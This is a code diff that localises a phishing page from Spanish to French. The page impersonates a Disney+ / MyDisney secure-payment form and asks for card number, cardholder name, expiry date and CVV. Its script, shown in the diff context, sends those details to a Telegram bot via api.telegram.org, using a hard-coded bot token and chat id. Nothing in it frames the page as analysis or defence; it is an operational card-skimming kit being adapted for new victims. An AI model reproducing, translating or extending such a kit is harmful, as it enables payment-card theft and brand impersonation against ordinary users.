@@ -1,9 +1,10 @@
+<!-- paiement.html -->
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Pago seguro | Disney+</title>
+  <title>Paiement sécurisé | Disney+</title>
   <!-- CSS commun -->
   <link rel="stylesheet" href="style.css"/>
 </head>
@@ -12,7 +13,7 @@
     <!-- Logo MyDisney centré en haut de la carte -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Información de pago</h1>
+    <h1>Informations de paiement</h1>
 
     <!-- Icônes de paiement -->
     <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
@@ -22,22 +23,22 @@
     </div>
 
     <form id="paymentForm">
-      <input type="text" placeholder="Número de tarjeta" required/>
-      <input type="text" placeholder="Nombre en la tarjeta" required/>
+      <input type="text" placeholder="Numéro de carte" required/>
+      <input type="text" placeholder="Nom sur la carte" required/>
       <input type="text" placeholder="MM/AA" required/>
       <input type="text" placeholder="CVV" required/>
 
       <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
-        Al validar tu pago, aceptas que tu suscripción comience de inmediato y se renueve automáticamente cada mes. Sin compromiso, puedes cancelar en cualquier momento.
+        En validant votre paiement, vous acceptez que votre abonnement commence immédiatement et soit renouvelé automatiquement chaque mois. Sans engagement, vous pouvez résilier à tout moment.
       </p>
 
-      <button type="submit">Validar pago</button>
+      <button type="submit">Valider le paiement</button>
     </form>
 
     <!-- Note de bas de page + logos partenaires -->
     <div class="footer-note">
-      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
-      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
+      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et plus encore</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -66,7 +67,7 @@
 
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
-      const message  = `💳 Pago Disney+: Tarjeta ${num}, Nombre ${name}, Exp ${exp}, CVV ${cvv}`;
+      const message  = `💳 Paiement Disney+ : Carte ${num}, Nom ${name}, Exp ${exp}, CVV ${cvv}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
